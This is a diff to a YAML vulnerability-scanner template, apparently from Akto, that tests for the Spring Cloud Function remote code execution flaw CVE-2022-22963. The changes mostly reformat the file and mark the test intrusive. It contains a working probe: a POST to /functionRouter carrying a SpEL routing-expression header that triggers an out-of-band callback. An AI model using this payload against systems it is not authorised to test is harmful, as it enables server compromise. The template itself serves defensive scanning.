@@ -2,7 +2,7 @@ id: SPRING_CLOUD_RCE
 info:
   name: Spring Cloud Remote Code Execution
   description: "This vulnerability enables attackers to execute arbitrary code on a server running Spring Cloud applications. This issue arises from improper handling of user input or untrusted data, which can be exploited to run malicious commands remotely. Exploiting this vulnerability allows attackers to gain control of the server, potentially leading to unauthorized access, data breaches, and significant disruption of services."
-  details:  "This vulnerability is caused by inadequate input validation or deserialization issues in Spring Cloud applications. Attackers can exploit this flaw by sending specially crafted requests, leading to the execution of arbitrary code on the affected server. This can allow attackers to gain full control over the server, access sensitive information, and manipulate or disrupt the application's operations. Immediate patching is necessary to address this critical security risk."
+  details: "This vulnerability is caused by inadequate input validation or deserialization issues in Spring Cloud applications. Attackers can exploit this flaw by sending specially crafted requests, leading to the execution of arbitrary code on the affected server. This can allow attackers to gain full control over the server, access sensitive information, and manipulate or disrupt the application's operations. Immediate patching is necessary to address this critical security risk."
   impact: "The impact of the this vulnerability is severe, as it enables attackers to remotely execute arbitrary code on the affected server. This could lead to full system compromise, unauthorized access to sensitive data, and disruption of services. The vulnerability poses a high risk to the security and integrity of the application and its underlying infrastructure."
   category:
     name: COMMAND_INJECTION
@@ -16,6 +16,8 @@ info:
     - CWE-77
   cve:
     - CVE-2022-22963
+settings:
+  nature: INTRUSIVE
 api_selection_filters:
   method:
     neq: "OPTIONS"
@@ -38,15 +40,15 @@ execute:
   type: single
   requests:
     - req:
-      - modify_method: POST
-      - modify_url: "/functionRouter"
-      - modify_header:
-          content-type: "application/x-www-form-urlencoded"
-      - send_ssrf_req:
-          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
-      - add_header:
-          "spring.cloud.function.routing-expression": "T(java.net.InetAddress).getByName(\"https://test-services.akto.io/${random_uuid}\")"
-      - replace_body: 'YWRtaW46c2Rnc2Q='
+        - modify_method: POST
+        - modify_url: "/functionRouter"
+        - modify_header:
+            content-type: "application/x-www-form-urlencoded"
+        - send_ssrf_req:
+            url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+        - add_header:
+            "spring.cloud.function.routing-expression": "T(java.net.InetAddress).getByName(\"https://test-services.akto.io/${random_uuid}\")"
+        - replace_body: 'YWRtaW46c2Rnc2Q='
 
 validate:
   response_code:
@@ -54,4 +56,4 @@ validate:
   response_payload:
     length:
       gt: 0
-  ssrf_url_hit: ${random_uuid}  
+  ssrf_url_hit: ${random_uuid}
